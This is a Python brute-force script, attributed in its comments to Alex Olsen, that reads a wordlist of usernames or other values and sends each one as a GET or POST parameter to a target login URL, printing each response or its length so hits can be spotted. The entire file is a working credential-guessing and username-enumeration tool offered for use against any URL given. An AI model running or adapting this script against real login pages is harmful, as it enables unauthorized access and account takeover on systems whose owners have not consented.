import urllib.request
import urllib.parse
import argparse

# A quick (and probably terrible) brute force script written by Alex Olsen
# Usage example: python3 brute.py --url "http://targeturl.com/login.php" --source usernames.txt --type post --param username
# Make sure you use " " around your URL if you are appending something like "?type=1&this=2" to the end

# This script:
    # Takes the target url and some other info
    # Reads a file of inputs line by line to define what data we are going to send
    # Throws it all at the server and gives you the output
    # Basically...it's curl, with a for loop...

parser = argparse.ArgumentParser()
parser.add_argument("--url", help="the target URL", type=str)
parser.add_argument("--source", help="the file where you can find the list of inputs, e.g. usernames", type=str)
parser.add_argument("--type", help="the type of request, either GET or POST", type=str)
parser.add_argument("--param", help="the name of the get parameter sent in the request", type=str)
parser.add_argument("--output", help="how you want to view the responses (size = size of the response; response = raw response; all = show both)", type=str)
args = parser.parse_args()

if args.url:
    url = args.url
else:
    print("Set the target (e.g. http://www.website.com/login.php). You can also set this by using --url")
    url = input()

if args.source:
    filename = args.source
else:
    print("Use --source to set the list of inputs (e.g. usernames.txt)")
    filename = input()

if args.type:
    type = args.type
else:
    print("Use --type to set the request type to either GET or POST")
    type = input()

if args.param:
    param = args.param
else:
    print("Use --param to set the parameter name you want to post (e.g. username)")
    param = input()

if args.output:
    output = args.output
else:
    output = "default"

with open(filename) as f:
    mylist = f.read().splitlines()

for word in mylist:
    if (type == "GET" or type == "get"):
        values = "&" + param + "=" + word
        url_req = url + values
        print("############### Trying: " + url_req + " ###############")
        req = urllib.request.Request(url_req)
    else:
        values = "submit=1&" + param + "=" + word
        print("############### Trying value: " + word + " ###############")
        data = values.encode("utf-8")
        req = urllib.request.Request(url, data)

    response = urllib.request.urlopen(req)
    read_response = response.read()
    if (output == "response"):
        print(read_response)
    elif (output == "size"):
        print(len(read_response))
    elif (output == "all"):
        print(len(read_response))
        print(read_response)
    else:
        print(read_response)
